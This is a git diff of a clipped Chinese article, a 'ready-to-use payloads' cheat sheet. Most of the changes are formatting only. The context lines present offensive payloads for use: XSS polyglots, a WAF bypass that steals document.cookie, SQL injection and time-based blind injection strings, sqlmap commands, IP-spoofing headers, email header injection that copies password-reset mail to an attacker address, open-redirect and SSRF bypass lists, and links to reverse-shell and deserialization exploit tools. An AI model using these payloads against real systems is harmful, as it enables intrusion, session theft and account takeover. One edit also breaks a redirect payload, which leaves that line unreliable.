@@ -1,5 +1,5 @@
 ---
-title: 【收藏】开箱即用的Payloads
+title: 【收藏】开箱即用的 Payloads
 url: https://mp.weixin.qq.com/s?__biz=MjM5Mzc4MzUzMQ==&mid=2650257988&idx=1&sn=f932fbc5e57520eeb23144a64de5cd01&chksm=be92d1c089e558d6f6635cf5c2a54df36d903dd2cad980cdd3753f72ea0cb2378a990bfc7036&mpshare=1&scene=1&srcid=0220AUCgGdJ1OL18pNWUrzKE&sharer_shareinfo=028fa2855cd84c3e169c7c9a336b11b0&sharer_shareinfo_first=028fa2855cd84c3e169c7c9a336b11b0#rd
 clipped_at: 2024-03-31 19:39:34
 category: temp
@@ -8,7 +8,7 @@ tags:
 ---
 
 
-# 【收藏】开箱即用的Payloads
+# 【收藏】开箱即用的 Payloads
 
 #   
 
@@ -27,9 +27,9 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20B
 (AWS Buckets)  
 http://www.xss-payloads.com
 
-# Payloads ‘奥义’
+# Payloads‘奥义’
 
-## 利用UTF-8的Bypass
+## 利用 UTF-8 的 Bypass
 
 ```plain
 < = %C0%BC = %E0%80%BC = %F0%80%80%BC
@@ -51,7 +51,7 @@ Null = %00
 <img src/onerror=alert(1)>
 <a href="javascript:alert(1)"></a>
 
-#XSS策略：
+#XSS 策略：
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 
 https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
@@ -59,16 +59,16 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 #Akamai WAF 绕过：
 <!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
 
-#注入XSS或注入其他html标签形成新的登录页面:
+#注入 XSS 或注入其他 html 标签形成新的登录页面：
 https://saajanbhujel.medium.com/how-i-got-10-000-from-github-for-bypassing-filtration-of-html-tags-db31173c8b37
 
 # XSS 执行 SSRF:
 <script>window.location="http://endereço.."</script>
 
-#其它:
+#其它：
 <IMG SRC=javascript:alert('XSS')>
 
-#jQuery 版本:
+#jQuery 版本：
 alert(jQuery.fn.jquery);
 ```
 
@@ -100,7 +100,7 @@ $'\U41' => 'A'  (HEX Unicode)
 $'\101' => 'A' (Octal)
 ```
 
-## SQL注入‘创意’
+## SQL 注入‘创意’
 
 ```plain
 1+OR/AND+1=1 and sELeCt/*Test*/1 and so .
@@ -117,7 +117,7 @@ $'\101' => 'A' (Octal)
 #SQL 盲注 与 绕过：
 Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
 
-#从SQL注入到RCE：
+#从 SQL 注入到 RCE：
 https://systemweakness.com/sql-injection-to-remote-command-execution-rce-dd9a75292d1d
 ```
 
@@ -129,7 +129,7 @@ https://www.100security.com.br/reverse-shell
   
 https://4bdoz.medium.com/rce-by-code-injection-perl-reverse-shell-a2e90181b10
 
-## 常用SQLMap 命令
+## 常用 SQLMap 命令
 
 ```plain
 https://github.com/sqlmapproject/sqlmap/wiki/Usage
@@ -156,7 +156,7 @@ batch:
 sqlmap.py -my \temp\sqlmap_targets.txt dbms
 ```
 
-## 通过 IP 绕过WAF控制
+## 通过 IP 绕过 WAF 控制
 
 ```plain
 X-Originating-IP:localhost
@@ -171,16 +171,16 @@ X-Host:localhost
 True-Client-Ip:localhost
 ```
 
-## 忘记密码-利用电子邮件头注入
+## 忘记密码 - 利用电子邮件头注入
 
 ```plain
 email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
 ```
 
-## 开放重定向/SSRF Payloads生成器
+## 开放重定向/SSRF Payloads 生成器
 
 ```plain
-#基本Payloads：
+#基本 Payloads：
 https://google.com/redirect.php?redirect=https:/facebook.com
 https://google.com/redirect.php?redirect=https://facebook.com
 https://google.com/redirect.php?redirect=http:/\/\facebook.com
@@ -222,12 +222,12 @@ https://google.com/redirect.php?redirect=
 #自右向左大法：
 https://google.com/redirect.php?redirect=%40%E2%80%AE@moc.koobecaf
 
-#空字节%00绕过黑名单过滤器：
+#空字节%00 绕过黑名单过滤器：
 https://google.com/redirect.php?redirect=facebook%00.com
 
 #'%E3%80%82' or '。'绕过：
 https://google.com/redirect.php?redirect=facebook%E3%80%82com
-https://google.com/redirect.php?redirect=facebook。com
+https://google.com/redirect.php?redirect=facebook. com
 ```
 
 ## SSRF 绕过列表
@@ -282,13 +282,13 @@ X-True-IP: 127.0.0.1
 ## 不安全的反序列化
 
 ```plain
-#基本Payloads:
+#基本 Payloads:
 https://github.com/pwntester/ysoserial.net
 
-#Json 不安全反序列化:
+#Json 不安全反序列化：
 https://medium.com/r3d-buck3t/insecure-deserialization-with-json-net-c70139af011a
 
-#Json payloads：
+#Json payloads:
 https://github.com/pwntester/ysoserial.net
 https://medium.com/c-sharp-progarmming/stop-insecure-deserialization-with-c-6a488c95cf2f
 ```
